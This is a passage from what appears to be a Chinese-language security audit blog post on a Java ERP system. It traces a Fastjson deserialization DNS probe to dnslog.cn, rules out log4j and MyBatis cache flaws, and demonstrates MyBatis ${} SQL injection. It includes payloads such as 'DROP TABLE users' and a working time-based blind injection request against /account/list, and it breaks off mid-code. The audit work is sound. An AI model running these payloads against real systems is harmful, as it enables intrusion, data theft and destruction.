+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HTTP</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="n">请求</span><span class="w"> </span><span class="err">：</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">list</span><span class="o">?</span><span class="n">search</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.net.Inet4Address&#34;</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="s">&#34;xxx.dnslog.cn&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">	</span><span class="n">ResourceController</span><span class="p">.</span><span class="na">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nf">getList</span><span class="p">(</span><span class="nd">@PathVariable</span><span class="p">(</span><span class="s">&#34;apiName&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">apiName</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">PAGE_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageSize</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">CURRENT_PAGE</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">currentPage</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Constants</span><span class="p">.</span><span class="na">SEARCH</span><span class="p">,</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">search</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">	</span><span class="n">UserComponent</span><span class="p">.</span><span class="na">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">getUserList</span><span class="err">#</span><span class="n">getInfo</span><span class="p">(</span><span class="n">search</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">JSONObject</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">search</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">DefaultJSONParser</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">parse</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">checkAutoType</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">loadClass</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">config</span><span class="p">.</span><span class="na">getDeserializers</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">clazz</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">Inet4Address</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">MiscCodec</span><span class="err">#</span><span class="n">ObjectDeserializer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="o">-&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">return</span><span class="w"> </span><span class="n">InetAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="n">strVal</span><span class="p">);</span><span class="w"> </span><span class="c1">//将strVal作为主机名,获取其对应的ip，域名在此处被解析</span><span class="w">
+</span></span></span></code></pre></div><h3 id="22-log4j-不存在">2.2 log4j （不存在）<a hidden class="anchor" aria-hidden="true" href="#22-log4j-不存在">#</a></h3>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png"></p>
+<p>并没有导入 log4j-core 包，单独的 log4j-to-slf4j  是不存在漏洞的</p>
+<p><code>log4j-to-slf4j</code> 是一个 <strong>桥接器（bridge）</strong>，它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印</p>
+<h3 id="23-mybatis">2.3 MyBatis <strong><!-- raw HTML omitted -->CVE-2020-26945（不存在）<!-- raw HTML omitted --></strong><a hidden class="anchor" aria-hidden="true" href="#23-mybatis">#</a></h3>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png"></p>
+<h4 id="漏洞点分析">漏洞点分析：<a hidden class="anchor" aria-hidden="true" href="#漏洞点分析">#</a></h4>
+<p><!-- raw HTML omitted -->SerializedCache#deserialize()<!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObject</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">delegate</span><span class="p">.</span><span class="na">getObject</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 如果取到的值是 null(过期)，直接返回 null；</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//deserialize((byte[]) object) 就是 RCE 的触发点了</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">object</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">deserialize</span><span class="p">((</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">object</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>跟进 delegate.getObject</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Cache</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObject</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>getObject    ctrl+alt+左键 转到声明</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png"></p>
+<p>跟进到 ScheduledCache</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObject</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//clearWhenStale() 检查缓存是否“过期”</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">clearWhenStale</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">delegate</span><span class="p">.</span><span class="na">getObject</span><span class="p">(</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">clearWhenStale</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">lastClear</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">clearInterval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">clear</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h4 id="利用条件"><!-- raw HTML omitted -->利用条件<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#利用条件">#</a></h4>
+<ol>
+<li><!-- raw HTML omitted -->用户启用了二级缓存功能<!-- raw HTML omitted --></li>
+</ol>
+<blockquote>
+<p><!-- raw HTML omitted -->二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png"></p>
+</blockquote>
+<ol start="2">
+<li><!-- raw HTML omitted -->攻击者可以修改缓存的内容，替换为恶意反序列化数据<!-- raw HTML omitted --></li>
+<li><!-- raw HTML omitted -->用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施<!-- raw HTML omitted --></li>
+</ol>
+<blockquote>
+<p><strong>JEP-290 是从 Java 9 开始引入的</strong>，在 Java 8 里 <strong>不存在全局或类级序列化过滤器</strong> 的机制</p>
+</blockquote>
+<p><strong>由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞</strong></p>
+<h2 id="接下来的审计按照以下方向进行">接下来的审计按照以下方向进行：<a hidden class="anchor" aria-hidden="true" href="#接下来的审计按照以下方向进行">#</a></h2>
+<ol>
+<li>SQL 注入</li>
+<li><del>文件安全 （在翻找功能点过程中并没有发现有能上传&amp;读取文件的点）</del></li>
+<li>身份验证&amp;鉴权 （LogCostFilter.java）</li>
+<li>第三方组件&amp;依赖 （已分析）</li>
+</ol>
+<h2 id="3mybatis-sql-注入">3、Mybatis SQL 注入<a hidden class="anchor" aria-hidden="true" href="#3mybatis-sql-注入">#</a></h2>
+<p>Mybatis框架的sql注入关注<code>${}</code>：</p>
+<p><code>${}</code>用于直接替换SQL语句中的占位符，而<code>#{}</code>用于预编译</p>
+<ol>
+<li>like模糊查询</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xml模板</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%${name}%&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sql注入</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">执行</span><span class="k">sql</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1%&#39;</span><span class="w">
+</span></span></span></code></pre></div><ol start="2">
+<li>动态列名 / 表名</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xml模板</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="err">${</span><span class="k">column</span><span class="err">}</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">#</span><span class="err">{</span><span class="n">id</span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sql注入</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">column</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;username, password from users --&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">执行</span><span class="k">sql</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="c1">-- FROM users WHERE id = ?
+</span></span></span></code></pre></div><ol start="3">
+<li>Order By</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xml模板</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="err">${</span><span class="n">sortColumn</span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sql注入</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sortColumn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;id; DROP TABLE users --&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">执行</span><span class="k">sql</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">id</span><span class="p">;</span><span class="w"> </span><span class="k">DROP</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="c1">-- 
+</span></span></span></code></pre></div><ol start="4">
+<li>IN</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xml模板</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="err">${</span><span class="n">ids</span><span class="err">}</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">sql注入</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="n">mapper</span><span class="p">.</span><span class="n">findByIds</span><span class="p">(</span><span class="s2">&#34;1,2,3 OR 1=1&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">执行</span><span class="k">sql</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><h3 id="accoutmapperexxml">AccoutMapperEx.xml<a hidden class="anchor" aria-hidden="true" href="#accoutmapperexxml">#</a></h3>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png"></p>
+<p>接下来考虑Controller/Service 中是否传入了 name 参数</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png"></p>
+<p>跟进 <!-- raw HTML omitted -->select，<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --> 从请求参数 map 中解析搜索条件  <!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png"></p>
+<p>寻找调用 <!-- raw HTML omitted -->getAccountList() 的位置<!-- raw HTML omitted --></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png"></p>
+<p>跟进 select</p>
+<p><!-- raw HTML omitted -->select(String apiName, Map&lt;String, String&gt; parameterMap) 是<!-- raw HTML omitted -->整个查询模块的统一入口</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png"></p>
+<p>继续跟进，</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png"></p>
+<p>接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png"></p>
+<p>对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“<!-- raw HTML omitted -->name, serialNo, remark<!-- raw HTML omitted -->”：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png"></p>
+<p>对 name 参数进行sql注入：</p>
+<p>从结果来看时间盲注成功了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D<span class="err">&amp;</span>currentPage=1<span class="err">&amp;</span>pageSize=15 HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 169.254.252.28:8123
+</span></span><span class="line"><span class="cl">Accept: application/json, text/javascript, */*; q=0.01
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+</span></span><span class="line"><span class="cl">X-Requested-With: XMLHttpRequest
+</span></span><span class="line"><span class="cl">Referer: http://169.254.252.28:8123/pages/manage/account.html
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GET /account/list?search={&#34;name&#34;:&#34;123&#39; or sleep(5)--+&#34;,&#34;serialNo&#34;:&#34;2&#34;,&#34;remark&#34;:&#34;3&#34;}<span class="err">&amp;</span>currentPage=1<span class="err">&amp;</span>pageSize=15 HTTP/1.1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">payload：
+</span></span><span class="line"><span class="cl">GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D<span class="err">&amp;</span>currentPage=1<span class="err">&amp;</span>pageSize=15 HTTP/1.1
+</span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png"></p>
+<p>在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 <strong>时间盲注生效</strong>：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png"></p>
+<h3 id="depotmapperexxml">DepotMapperEx.xml<a hidden class="anchor" aria-hidden="true" href="#depotmapperexxml">#</a></h3>
+<p>通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。</p>
+<p>再以DepotMapperEx.xml 为例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;select id=&#34;selectByConditionDepot&#34; parameterType=&#34;com.jsh.erp.datasource.entities.DepotExample&#34; resultMap=&#34;ResultMapEx&#34;&gt;
+</span></span><span class="line"><span class="cl">  select dep.*,usr.username as principalName
+</span></span><span class="line"><span class="cl">  FROM jsh_depot dep
+</span></span><span class="line"><span class="cl">  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#39;0&#39;) not in(&#39;1&#39;,&#39;2&#39;)
+</span></span><span class="line"><span class="cl">  where 1=1
+</span></span><span class="line"><span class="cl">  &lt;if test=&#34;name != null&#34;&gt;
+</span></span><span class="line"><span class="cl">    and dep.name like &#39;%${name}%&#39;
+</span></span><span class="line"><span class="cl">  &lt;/if&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt;selectByConditionDepot
+</span></span><span class="line"><span class="cl">public interface DepotMapperEx {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    List&lt;DepotEx&gt; selectByConditionDepot(
+</span></span><span class="line"><span class="cl">            @Param(&#34;name&#34;) String name,
+</span></span><span class="line"><span class="cl">            @Param(&#34;type&#34;) Integer type,
+</span></span><span class="line"><span class="cl">            @Param(&#34;remark&#34;) String remark,
+</span></span><span class="line"><span class="cl">            @Param(&#34;offset&#34;) Integer offset,
+</span></span><span class="line"><span class="cl">            @Param(&#34;rows&#34;) Integer rows);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt;DepotService
+</span></span><span class="line"><span class="cl">public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception {
+</span></span><span class="line"><span class="cl">        List&lt;DepotEx&gt; list=null;
+</span></span><span class="line"><span class="cl">        try{
+</span></span><span class="line"><span class="cl">            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);
+</span></span><span class="line"><span class="cl">        }catch(Exception e){
+</span></span><span class="line"><span class="cl">            JshException.readFail(logger, e);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return list;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt;select
+</span></span><span class="line"><span class="cl">@Override
+</span></span><span class="line"><span class="cl">    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception {
+</span></span><span class="line"><span class="cl">        return getDepotList(map);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception {
+</span></span><span class="line"><span class="cl">        String search = map.get(Constants.SEARCH);
+</span></span><span class="line"><span class="cl">        String name = StringUtil.getInfo(search, &#34;name&#34;);
+</span></span><span class="line"><span class="cl">        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &#34;type&#34;));
+</span></span><span class="line"><span class="cl">        String remark = StringUtil.getInfo(search, &#34;remark&#34;);
+</span></span><span class="line"><span class="cl">        String order = QueryUtils.order(map);
+</span></span><span class="line"><span class="cl">        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt;select
+</span></span><span class="line"><span class="cl"> /**
+</span></span><span class="line"><span class="cl">     * 查询
+</span></span><span class="line"><span class="cl">     * @param apiName
+</span></span><span class="line"><span class="cl">     * @param parameterMap
+</span></span><span class="line"><span class="cl">     * @return
+</span></span><span class="line"><span class="cl">     */
+</span></span><span class="line"><span class="cl">    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception {
+</span></span><span class="line"><span class="cl">        if (StringUtil.isNotEmpty(apiName)) {
+</span></span><span class="line"><span class="cl">            return container.getCommonQuery(apiName).select(parameterMap);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return new ArrayList&lt;Object&gt;();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-&gt;select
+</span></span><span class="line"><span class="cl">@GetMapping(value = &#34;/{apiName}/list&#34;)
+</span></span><span class="line"><span class="cl">    public String getList(@PathVariable(&#34;apiName&#34;) String apiName,
+</span></span><span class="line"><span class="cl">                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,
+</span></span><span class="line"><span class="cl">                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,
+</span></span><span class="line"><span class="cl">                        @RequestParam(value = Constants.SEARCH, required = false) String search,
